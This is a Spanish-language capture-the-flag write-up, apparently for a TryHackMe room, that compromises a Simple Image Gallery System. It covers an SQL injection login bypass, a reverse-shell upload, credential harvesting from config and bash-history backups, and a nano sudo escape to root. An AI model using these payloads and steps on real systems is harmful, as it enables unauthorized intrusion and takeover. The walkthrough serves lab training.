PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

-Entramos por el puerto 8080 y nos redirige a un login

-Vemos que el servicio se llama Simple Image Gallery System. Buscamos exploits y analizando el código vemos que el login es vulnerable a sql injection, por lo que aplicamos una sqli muy simple para saltarnos el login:
	username: ' or true-- -

-Entramos a un dashboard, nos vamos a cuenta y en la parte de subir imagen de perfil subimos la reverse shell de PentestMonkey

## Escalada de Privilegios

-Hay que hacer una buena enumeración del servidor 

-Dentro de /var/www/html/gallery/initialize.php encontramos credenciales para autenticarnos en mysql en localhost:
	username: gallery_user
	password: passw0rd321

-Nos conectamos a mysql por localhost:
	mysql -u gallery_user -ppassw0rd321
	si ponemos -p passw0rd321 no funciona, hay que ponerlo junto. También se puede hacer así:
		mysql -u gallery_user -p
		Te pide la password: passw0rd321

-Vamos a enumerar la BBDD en busca de usuarios:

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+

MariaDB [(none)]> use gallery_db

MariaDB [gallery_db]> show tables 
	Users
	sys_info
	uploads

Select * from users;

-Encontramos la password en formato hash del usuario admin. Solo nos sirve para contestar a una pregunta de la room de tryhackme, ya que no podemos romper el hash.

-Volvemos a enumerar la máquina. Dentro de /home/mike/.bash_history no tenemos permisos. Sin embargo, en la ruta /var/backups/mike_home_backup podemos acceder al backup del usuario mike y tenemos permisos de lectura en el fichero .bash_history. Dentro encontramos lo siguiente:
	sudo -lb3stpassw0rdbr0x
	Parece que el usuario mike ha intentado hacer un sudo -l y ha puesto la contraseña sin poner espacio. 
	
-Ahora que tenemos su contraseña, pivotamos al usuario mike:
	su mike
	password: b3stpassw0rdbr0x

-Vamos a ver que comandos puede ejecutar el usuario mike como sudo:
	mike@gallery:/var/backups/mike_home_backup$ sudo -l
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

-Vamos a analizar el contenido del fichero rootkit.sh
	cat /opt/rootkit.sh
		#!/bin/bash
		read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
		case $ans in
		    versioncheck)
		        /usr/bin/rkhunter --versioncheck ;;
		    update)
		        /usr/bin/rkhunter --update;;
		    list)
		        /usr/bin/rkhunter --list;;
		    read)
		        /bin/nano /root/report.txt;;
		    *)
		        exit;;

-La 4 opcion 'read' ejecuta un nano para abrir el fichero /root/report.txt. Como estamos ejecutando el script con permisos de sudo, va a ejecutar nano con dichos permisos

-Buscamos en gtobinst el binario nano con permisos de sudo.  Ejecutamos el fichero /opt/rootkit.sh, elegimos la opcion 4 'read' y pegamos el código de gtfobins:
	sudo /bin/bash /opt/rootkit.sh
	Would you like to versioncheck, update, list or read the report: read
	-En la consola de nano pegamos el código de gtfobins: ```
	^R^X
	reset; sh 1>&0 2>&0

root@gallery:/root# whoami
root



